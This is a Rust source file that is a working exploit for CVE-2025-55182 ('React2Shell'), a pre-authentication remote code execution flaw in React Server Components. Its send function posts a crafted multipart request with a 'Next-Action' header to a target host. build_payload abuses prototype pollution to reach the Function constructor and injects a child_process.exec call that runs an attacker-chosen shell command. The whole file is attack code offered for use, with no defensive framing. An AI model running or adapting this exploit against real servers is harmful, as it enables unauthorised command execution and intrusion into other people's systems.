use std::env::Args;
use std::time::Duration;
use reqwest::Client;
/** CVE-2025-55182 Detail React2Shell
A pre-authentication remote code execution vulnerability exists in React Server
Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including the following
packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack.
The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.
*/

use reqwest::multipart::{Form, Part};
use serde_json::{json, Value};

pub async fn send(prefix_value: &str, host: &str) -> Result<(), Box<dyn std::error::Error>> {

    let payload = build_payload(prefix_value);

    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .build()?;

    let res = client
        .post(host)
        .header("Next-Action", "x")
        .multipart(payload)
        .send().await;

    let resp = match res {
        Ok(r) => r,          // <-- r é Response, aqui o tipo fecha
        Err(e) => {
            match classify(&e) {
                HttpErr::Timeout => println!("{host} got a timeout"),
                HttpErr::Connect => println!("{host} connection failed"),
                HttpErr::Status(code) => println!("{host} returned http {code}"),
                HttpErr::Other(msg) => println!("error sending to {host}: {msg}"),
            }
            return Ok(());
        }
    };


    println!("fetched: {:?}", resp);
    let text = resp.text().await?;
    println!("got: {}", text);

    Ok(())
}

// Função interna que monta o payload fixo com _prefix substituível
fn build_payload(prefix_value: &str) -> Form {

    let crafted_chunk = json!({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\"then\": \"$B0\"}",
        "_response": {
            "_prefix": format!(
                "process.mainModule.require(\"child_process\").exec(\"{}\")//",
                prefix_value
            ),
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    });

    let form = Form::new()
        .part("0", Part::text(serde_json::to_string(&crafted_chunk).expect("ERR")))
        .part("1", Part::text("\"$@0\"".to_string()));

    form
}

#[derive(Debug)]
pub enum HttpErr {
    Timeout,
    Connect,
    Status(u16),
    Other(String),
}

fn classify(e: &reqwest::Error) -> HttpErr {
    if e.is_timeout() {
        return HttpErr::Timeout;
    }
    if e.is_connect() {
        return HttpErr::Connect;
    }
    if let Some(status) = e.status() {
        return HttpErr::Status(status.as_u16());
    }
    HttpErr::Other(e.to_string())
}

